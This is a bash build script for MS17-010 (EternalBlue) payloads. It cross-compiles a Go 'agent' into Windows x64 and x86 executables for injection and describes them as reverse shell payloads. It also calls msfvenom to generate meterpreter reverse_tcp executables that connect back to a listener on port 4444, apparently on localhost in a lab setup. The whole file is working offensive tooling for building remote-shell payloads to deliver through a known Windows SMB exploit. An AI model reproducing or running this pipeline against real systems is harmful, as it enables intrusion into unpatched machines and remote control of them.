#!/bin/bash

# Build script for MS17-010 payloads
# Compiles agent.go into agent.exe for injection

set -e

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"
OUTPUT_DIR="${REPO_ROOT}/static/payloads"

mkdir -p "$OUTPUT_DIR"

echo "[*] Building reverse shell payloads..."

# Build agent.exe
echo "[+] Building agent.exe (x64)..."
cd "$SCRIPT_DIR"

# Cross-compile for Windows x64
GOOS=windows GOARCH=amd64 go build \
    -o "$OUTPUT_DIR/agent_x64.exe" \
    -ldflags="-s -w" \
    agent.go

echo "[+] Built: $OUTPUT_DIR/agent_x64.exe"

# Optional: build x86 version
echo "[+] Building agent.exe (x86)..."
GOOS=windows GOARCH=386 go build \
    -o "$OUTPUT_DIR/agent_x86.exe" \
    -ldflags="-s -w" \
    agent.go

echo "[+] Built: $OUTPUT_DIR/agent_x86.exe"

# Optional: use msfvenom to generate payloads if available
if command -v msfvenom &> /dev/null; then
    echo "[*] Generating msfvenom payloads..."

    # Windows x64 meterpreter reverse TCP
    echo "[+] Generating meterpreter x64..."
    msfvenom -p windows/x64/meterpreter/reverse_tcp \
        LHOST=127.0.0.1 LPORT=4444 \
        -f exe -o "$OUTPUT_DIR/meterpreter_x64.exe" 2>/dev/null || true

    # Windows x86 meterpreter reverse TCP
    echo "[+] Generating meterpreter x86..."
    msfvenom -p windows/meterpreter/reverse_tcp \
        LHOST=127.0.0.1 LPORT=4444 \
        -f exe -o "$OUTPUT_DIR/meterpreter_x86.exe" 2>/dev/null || true
else
    echo "[!] msfvenom not found, skipping meterpreter payloads"
fi

echo "[✓] Payloads built successfully"
echo ""
echo "Available payloads:"
ls -lh "$OUTPUT_DIR"/*.exe 2>/dev/null || echo "No payloads found"
